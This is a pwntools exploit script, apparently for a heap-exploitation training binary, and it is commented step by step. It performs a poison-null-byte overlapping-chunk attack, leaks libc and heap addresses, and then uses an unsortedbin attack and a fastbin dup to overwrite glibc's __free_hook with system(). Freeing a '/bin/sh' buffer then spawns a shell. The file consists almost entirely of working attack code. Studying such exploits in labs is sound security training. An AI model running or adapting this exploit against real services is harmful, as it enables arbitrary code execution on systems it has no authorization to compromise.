#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./poison_null_byte', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main
b *main+244
b *main+366
b *main+663
b *main+767
b *main+848
b *main+936
b *main+1045
"""


def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

index = 0

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1
    
def edit(index, data):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)  
    io.recvuntil(b"> ")

def free(index):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())  
    io.recvuntil(b"> ")

def read(index, size):
    io.send(b'4')
    io.sendafter(b'index: ', str(index).encode())  
    res = io.recv(size)
    io.recvuntil(b"> ")   
    return res


io = start()
io.timeout = 0.1

io.recvuntil(b"> ")  
# =============================================================================

# =-=-=- CREATE OVERLAPPING CHUNKS -=-=-=

# Request 4 chunks.
overflow = malloc(0x88) # Overflow from this chunk into the succeeding chunk's size field.
victim = malloc(0x208) # Victim chunk.
consolidate = malloc(0x88) # Free this chunk to consolidate over the "victim" chunk.
guard = malloc(0x18) # Guard against consolidation with the top chunk.

# Set up a fake prev_size field for the "victim" chunk to satisfy the size vs. prev_size check in GLIBC versions >= 2.26.
edit(victim, p8(0) * 0x1f0 + p16(0x200))

# Free the "victim" chunk into the unsortedbin.
free(victim)

# Leverage a single null-byte overflow into the "victim" chunk's size field to scrub 0x10 bytes from its size.
edit(overflow, p8(0) * 0x88)

# Request 2 chunks in the space previously occupied by the "victim" chunk: "victim_A" & "victim_B".
# The succeeding chunk's prev_size field is not updated because the "victim" chunk appears 0x10 bytes smaller.
victim_A = malloc(0xf8)
victim_B = malloc(0xf8)

# Free "victim_A" into the unsortedbin.
free(victim_A)

# Free the "consolidate" chunk succeeding "victim_B", consolidating it backward over "victim_A" & "victim_B".
free(consolidate)


# =-=-=- LEAK THE HEAP & UNSORTEDBIN ADDRESS -=-=-=

# Request "victim_A" again; the remaindering process writes unsortedbin metadata into "victim_B", which is still allocated.
victim_A1 = malloc(0xf8)

# Free the "overflow" chunk to link it into the unsortedbin, writing a heap address into the metadata overlapping "victim_B".
# Unnecessary for this route but could be useful in other scenarios.
free(overflow)

# Leak the heap and libc via "victim_B".
data = read(victim_B, 16)
libc.address = unpack(data[:8]) - (libc.sym['main_arena'] + 0x58)
heap = unpack(data[8:])
success("libc base @ " + hex(libc.address))
success("heap @ " + hex(heap))

# =-=-=- PREPARE A FASTBIN DUP & UNSORTEDBIN ATTACK -=-=-=

# Request the "overflow" chunk from the unsortedbin, otherwise it will interfere with our request pattern.
overflow1 = malloc(0x88)

# Request a 0x70-sized chunk from what remains of the "victim" chunk.
fast = malloc(0x68)

# Free this chunk into the 0x70 fastbin; its fd overlaps the "victim_B" chunk, which is still allocated.
free(fast)

# Modify the "fast" chunk's fd to point near to the free hook.
# Craft a fake 0x20-sized chunk over the chunk that's linked into the unsortedbin, ready for an unsortedbin attack.
edit(victim_B, pack(libc.sym['__free_hook'] - 0x16) + p8(0)*0x60 + p64(0x21) + p64(0) + pack(libc.sym['__free_hook'] - 0x23))

# =-=-=- UNSORTEDBIN ATTACK NEAR THE FREE HOOK -=-=-=

# Request the 0x20 chunk from the unsortedbin, triggering the unsortedbin attack and writing a 0x7f size field near to the free hook.
unsortedbin_attack = malloc(0x18)

# =-=-=- OVERWRITE THE FREE HOOK -=-=-=

# Use the result of the unsortedbin attack to fastbin dup over the free hook.
fast_dup = malloc(0x68)
overwrite = malloc(0x68)

# Overwrite the free hook with the address of system().
edit(overwrite, p8(0)*6 + pack(libc.sym['system']))
# Create and free a "/bin/sh" chunk.
edit(guard, b'/bin/sh\x00')
io.send(b"3")
io.sendafter(b"index: ", f"{guard}".encode())

io.interactive()